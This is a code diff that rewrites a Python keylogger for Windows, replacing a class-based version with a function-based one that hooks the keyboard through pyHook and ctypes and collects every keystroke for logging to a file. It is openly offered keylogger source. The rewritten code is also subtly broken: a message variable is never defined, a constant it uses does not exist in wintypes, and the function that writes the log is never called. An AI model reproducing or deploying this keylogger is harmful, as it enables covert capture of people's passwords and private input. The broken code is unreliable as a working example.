@@ -2,41 +2,48 @@ import os
 import sys
 import ctypes
 import pyHook
-import pythoncom
-from threading import Thread
+from ctypes import wintypes
 
-class KeyLogger:
-    def __init__(self):
-        self.filename = "keylog.txt"
-        self.start_recording()
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
 
-    def OnKeyboardEvent(self, event):
-        if event.Ascii == 27:  # ESC key
-            return False  # Stop recording
-        elif event.Ascii == 32:  # SPACE key
-            key = "[SPACE]"
-        elif event.Ascii == 13:  # ENTER key
-            key = "[ENTER]\n"
-        else:
-            key = chr(event.Ascii)
-        self.write_to_file(key)
-        return True  # Continue recording
+target_pid = os.getpid()
 
-    def write_to_file(self, data):
-        with open(self.filename, "a") as file:
-            try:
-                file.write(data)
-            except Exception as e:
-                print(f"Error writing to file: {e}")
+keystrokes = ''
+file_path = 'C:\\keylog.txt'  # specify your file path here
 
-    def start_recording(self):
-        hooks_manager = pyHook.HookManager()  # Create a hook manager
-        hooks_manager.KeyDown = self.OnKeyboardEvent  # Define the callback function for key events
-        hooks_manager.HookKeyboard()  # Set the hooks
-        pythoncom.PumpMessages()  # Wait for ESC key to be pressed
+def OnKeyboardEvent(event):
+    global keystrokes
+    if event.KeyID == 27: # ESC key pressed
+        return False
+    elif event.Ascii > 31 and event.Ascii < 128:
+        keystrokes += chr(event.Ascii)
+    else:
+        keystrokes += '[' + event.Key + ']'
+    return True
 
-if __name__ == "__main__":
+def write_to_file():
+    global keystrokes
     try:
-        keylogger = KeyLogger()
+        with open(file_path, 'a') as f:
+            f.write(keystrokes)
+            print('[+] Keystroke data written to file:', file_path)  # optional debug print
     except Exception as e:
-        print(f"Error occurred: {e}")
+        print('[-] Error writing to file:', str(e)) 
+        sys.exit()
+    finally:
+        keystrokes = ''
+
+def main():
+    hm = pyHook.HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    hm.HookKeyboard()
+    while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
+        if msg.message == wintypes.WM_QUIT:
+            break
+        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
+        ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
+    kernel32.ExitProcess(0)
+
+if __name__ == '__main__':
+    main()
